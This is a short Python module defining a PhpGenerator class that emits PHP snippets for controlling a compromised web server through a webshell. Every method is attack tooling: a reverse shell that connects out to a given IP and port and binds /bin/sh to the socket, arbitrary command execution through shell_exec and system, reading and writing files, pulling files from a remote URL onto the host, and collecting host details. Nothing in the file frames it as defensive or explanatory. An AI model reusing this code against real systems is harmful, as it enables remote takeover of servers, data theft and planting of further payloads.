"""PHP code generator for webshell operations."""


class PhpGenerator:
    """Generate PHP code for webshell operations."""

    @staticmethod
    def reverse_shell(target_ip: str, target_port: int) -> str:
        """Generate PHP reverse shell code."""
        return f"""$sock=fsockopen("{target_ip}",{target_port});
exec("/bin/sh -i <&3 >&3 2>&3");"""

    @staticmethod
    def read_file(file_path: str, encoding: str = "utf-8") -> str:
        """Generate PHP code to read file."""
        return f"file_get_contents('{file_path}')"

    @staticmethod
    def write_file(file_path: str, content: str, encoding: str = "utf-8") -> str:
        """Generate PHP code to write file."""
        return f"file_put_contents('{file_path}', base64_decode('{content}'))"

    @staticmethod
    def run_command(command: str, capture_output: bool = True) -> str:
        """Generate PHP code to execute command."""
        if capture_output:
            return f"shell_exec('{command}')"
        else:
            return f"system('{command}')"

    @staticmethod
    def list_directory(directory: str = ".") -> str:
        """Generate PHP code to list directory."""
        return f"implode('\\n', scandir('{directory}'))"

    @staticmethod
    def download_file(url: str, save_path: str) -> str:
        """Generate PHP code to download file."""
        return f"file_put_contents('{save_path}', file_get_contents('{url}'))"

    @staticmethod
    def upload_file(file_path: str, content: str) -> str:
        """Generate PHP code to upload file (base64 content)."""
        return f"file_put_contents('{file_path}', base64_decode('{content}'))"

    @staticmethod
    def get_system_info() -> str:
        """Generate PHP code to get system info."""
        return """echo json_encode([
    'os' => PHP_OS,
    'hostname' => gethostname(),
    'user' => get_current_user(),
    'cwd' => getcwd()
]);"""
